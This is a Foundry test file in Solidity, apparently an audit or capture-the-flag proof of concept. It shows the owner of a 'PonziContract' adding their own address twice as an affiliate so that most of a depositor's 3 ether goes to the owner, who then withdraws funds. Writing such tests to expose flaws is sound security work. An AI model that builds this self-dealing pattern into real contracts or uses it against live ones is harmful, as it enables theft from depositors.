// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

import "forge-std/Test.sol";
import {PonziContract} from "../src/PonziContract/PonziContract.sol";

contract OwnerScamTest is Test {
    PonziContract ponziContract;
    address person1 = vm.addr(1);
    address person2 = vm.addr(2);
    address person3 = vm.addr(3);
    address owner = vm.addr(4);

    uint256 ETHER_TO_TRANSFER = 10 ether;

    function setUp() external {
        vm.startPrank(owner);
        ponziContract = new PonziContract();
        vm.stopPrank();
        vm.deal(address(person1), ETHER_TO_TRANSFER);
        vm.deal(address(person2), ETHER_TO_TRANSFER);
        vm.deal(address(person3), ETHER_TO_TRANSFER);
        // vm.deal(address(ponziContract), ETHER_TO_TRANSFER);
    }

    function testJoinPonziOwnerScam() public {
        uint256 deadlineOk = 2000;
        vm.startPrank(owner);
        ponziContract.setDeadline(deadlineOk);
        ponziContract.addNewAffilliate(address(person1));
        ponziContract.addNewAffilliate(address(owner));
        ponziContract.addNewAffilliate(address(owner));

        changePrank(person1);

        address[] memory affilatesArray = new address[](3);
        affilatesArray[0] = address(person1);
        affilatesArray[1] = address(owner);
        affilatesArray[2] = address(owner);

        // Person1 deposit 3 ether, but lost 2 of them.
        changePrank(person1);
        assertEq(address(owner).balance, 0);
        ponziContract.joinPonzi{value: 3 ether}(affilatesArray);

        assertEq(address(person1).balance, 8 ether);
        assertEq(address(owner).balance, 2 ether);

        changePrank(owner);
        ponziContract.ownerWithdraw(owner, 2 ether);
        assertEq(address(owner).balance, 2 ether);
    }
}
